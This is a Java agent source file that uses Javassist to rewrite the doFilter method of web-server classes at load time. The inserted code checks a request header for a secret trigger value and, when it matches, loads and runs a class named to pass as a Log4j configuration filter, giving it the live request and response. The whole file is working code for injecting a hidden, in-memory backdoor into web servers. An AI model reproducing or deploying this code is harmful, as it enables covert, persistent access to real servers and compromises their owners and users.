package com;

import javassist.*;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classFileBuffer) {

        if (!Constant001.WEB_SERVER_LIST.contains(className.replace('/', '.'))) {
            return null;
        }

        Constant001.logger.info("exist web server");

        try {
            ClassPool pool = new ClassPool(true);
            if (loader != null) {
                pool.appendClassPath(new LoaderClassPath(loader));
            }

            CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
            CtMethod doFilter = cc.getDeclaredMethod("doFilter");

            doFilter.insertBefore(
                    "{ " +
                            "    com.Constant001.logger.info(\"[Agent] into doFilter\");" +
                            "    Object reqObj = $1;" +
                            "    Object resObj = $2;" +
                            "    try {" +
                            "        java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
                            "        String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"" + Constant001.HEADER_PARAM + "\" });" +
                            "        if (ua != null && ua.toLowerCase().contains(\"" + Constant001.HEADER_PARAM_VALUE.toLowerCase() + "\")) {" +
                            "            try {" +
                            "                ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
                            "                if (cl == null) cl = this.getClass().getClassLoader();" +
                            "                Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" + // 注意包名是否正确
                            "                java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                            "                Object obj = m.invoke(null, new Object[]{ cl });" +
                            "                java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
                            "                exec.invoke(obj, new Object[]{ reqObj, resObj });" +
                            "            } catch (Throwable t) {" +
                            "                com.Constant001.logger.severe(\"[Agent] Log4jConfigPdFilter loading exception! detail info: \" + t.getMessage());" +
                            "            }" +
                            "            return;" +
                            "        }" +
                            "    } catch (Throwable e) { com.Constant001.logger.severe(\"[Agent] FilterChain exception! detail info: \" + e.getMessage()); }" +
                            "}"
            );


            Constant001.logger.info("[+] Hooked doFilter successfully.");
            byte[] bytecode = cc.toBytecode();
            cc.detach();
            return bytecode;

        } catch (Throwable e) {
            Constant001.logger.info(e.getMessage());
            return null;
        }

    }
}
